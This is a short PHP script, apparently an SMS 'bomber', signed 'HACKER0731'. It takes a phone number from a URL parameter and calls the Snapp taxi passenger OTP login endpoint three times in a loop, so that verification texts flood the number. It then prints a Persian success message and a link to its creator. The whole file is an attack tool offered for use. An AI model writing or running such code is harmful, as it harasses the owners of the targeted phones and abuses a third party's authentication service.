<?php 
//#######[get]#######\\
$shomare1 = $_GET [ "shomare" ] ; 
$i = 1;
while  ( $i <= 3) 
{
    //HACKER0731 \\
	$like = file_get_contents("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp=$shomare1&providerID=5&requestCode=4d3b7599-b43e-4a37-a8a4-b54d09470910");
	$i++;
}
	echo 'با موفقیت انجام شد <br> <a href="https:/mahdi_illusion">سازنده</a>'





// [HACKER0731 ] \\ 
?>

